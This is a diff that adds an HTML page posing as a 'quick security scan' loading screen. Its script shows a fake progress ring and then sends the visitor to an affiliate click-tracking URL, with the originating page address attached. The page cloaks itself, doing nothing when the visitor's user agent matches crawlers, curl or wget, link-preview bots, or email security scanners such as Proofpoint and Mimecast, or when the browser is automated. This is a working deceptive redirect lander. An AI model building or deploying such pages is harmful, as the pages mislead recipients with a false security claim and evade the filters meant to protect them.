@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Loading…</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,"Segoe UI",Roboto,sans-serif;
+    background:#ecfdf5;color:#065f46;display:flex;align-items:center;justify-content:center;
+    min-height:100dvh;padding:22px;overflow:hidden;
+  }
+  .plate{
+    width:100%;max-width:400px;background:#fff;border-radius:24px;
+    padding:36px 26px 26px;text-align:center;
+    box-shadow:0 22px 56px rgba(6,95,70,.12);
+  }
+  .load-ring{
+    position:relative;width:110px;height:110px;margin:0 auto 18px;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .load-ring svg{position:absolute;inset:0;width:100%;height:100%;transform:rotate(-90deg)}
+  .load-ring circle{fill:none;stroke-width:8}
+  .bg-r{stroke:#d1fae5}
+  .fg-r{stroke:#10b981;stroke-dasharray:302;stroke-dashoffset:302;transition:stroke-dashoffset .25s linear;stroke-linecap:round}
+  .pct{
+    font-size:24px;font-weight:800;color:#047857;
+    font-variant-numeric:tabular-nums;
+  }
+  h1{font-size:20px;font-weight:800;margin-bottom:8px;color:#065f46}
+  p{font-size:13.5px;color:#4a7c65;line-height:1.5;margin-bottom:22px}
+  .s{font-size:12px;color:#6ea38e;min-height:16px;margin-bottom:6px}
+  .btn{
+    width:100%;padding:15px;border:0;border-radius:12px;
+    background:#10b981;color:#fff;font-family:inherit;font-size:15px;
+    font-weight:700;cursor:pointer;min-height:52px;display:none;
+  }
+  .btn:active{transform:scale(.985)}
+  .btn.on{display:block;animation:zippy .3s ease}
+  @keyframes zippy{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:none}}
+</style>
+</head>
+<body>
+<div class="plate">
+  <div class="load-ring">
+    <svg viewBox="0 0 110 110">
+      <circle class="bg-r" cx="55" cy="55" r="48"></circle>
+      <circle class="fg-r" id="rc7" cx="55" cy="55" r="48"></circle>
+    </svg>
+    <div class="pct" id="pc7">0%</div>
+  </div>
+  <h1>Loading your access</h1>
+  <p>Quick security scan is running.<br>You'll be redirected automatically.</p>
+  <div class="s" id="sc7">Scanning…</div>
+  <button class="btn" id="bc7" type="button">Continue →</button>
+</div>
+<script>
+(function(){
+  var LAST="https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS";
+  var Q="referrerCF";
+  var DASH=302;
+  var rc=document.getElementById("rc7"),pc=document.getElementById("pc7"),
+      sc=document.getElementById("sc7"),bc=document.getElementById("bc7");
+  var ua=navigator.userAgent||"";
+  var filt=/bot\b|crawler|spider|curl\/|wget\/|python-requests|headlesschrome|phantomjs|googlebot|bingpreview|yandexbot|duckduckbot|facebookexternalhit|telegrambot|googleimageproxy|yahoomailproxy|ms-office|barracuda|proofpoint|mimecast/i;
+  if(filt.test(ua))return;
+  if(navigator.webdriver)return;
+  var h=false;
+  ["pointerdown","touchstart","keydown","scroll","mousemove"].forEach(function(ev){
+    window.addEventListener(ev,function(){h=true},{passive:true});
+  });
+  var dur=1500+Math.random()*1000;
+  var t0=Date.now();
+  function tick(){
+    var e=Date.now()-t0;
+    var p=Math.min(1,e/dur);
+    rc.style.strokeDashoffset=(DASH*(1-p)).toFixed(1);
+    pc.textContent=Math.round(p*100)+"%";
+    if(p<1){requestAnimationFrame(tick);return;}
+    sc.textContent=h?"Ready when you are ✓":"Tap to continue";
+    bc.classList.add("on");
+  }
+  requestAnimationFrame(tick);
+  var sent=false;
+  bc.addEventListener("click",function(e){
+    e.preventDefault();if(sent)return;sent=true;
+    bc.disabled=true;bc.style.opacity=".6";sc.textContent="Redirecting…";
+    var full=LAST+"&"+Q+"="+encodeURIComponent(location.href);
+    try{
+      var ping=new Image();
+      ping.src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
+    }catch(err){}
+    setTimeout(function(){
+      try{window.location.replace(full);}
+      catch(err){window.location.href=full;}
+    },120);
+  });
+})();
+</script>
+</body>
+</html>
